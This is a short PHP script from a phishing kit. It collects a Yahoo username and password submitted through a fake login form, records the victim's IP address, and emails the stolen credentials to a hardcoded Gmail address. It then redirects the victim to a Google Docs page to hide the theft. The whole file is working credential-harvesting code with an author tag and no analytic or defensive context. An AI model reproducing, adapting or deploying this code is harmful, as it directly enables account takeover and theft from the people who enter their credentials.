<?php

session_start();
$ip = getenv("REMOTE_ADDR");
//$adddate=date("D M d, Y g:i a");
$message .= "--------      UserID      ------------------------------\n";
$message .= "UserID: ".$_POST['yahoouser']."\n";
$message .= "Password: ".$_POST['yahoopassword']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--------Created By Noble------------------------------\n";

$recipient = "leilapacha80@gmail.com";
$subject = "Yahoo";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&frm=1&source=web&cd=6&ved=0CEEQFjAF&url=https%3A%2F%2Fdocs.google.com%2Fdocument%2Fd%2F1ql4DAfVsAhJ8Xk8cXbpaj96ANNnhFyd-NQxrY7_dHec%2Fedit&ei=emP6UYbPBLXB4AP0_IG4CA&usg=AFQjCNHd6wNqKfWolI0fxnb26kfGMTpRXA&bvm=bv.50165853,d.dmg&cad=rja");

	   }


?>Wizard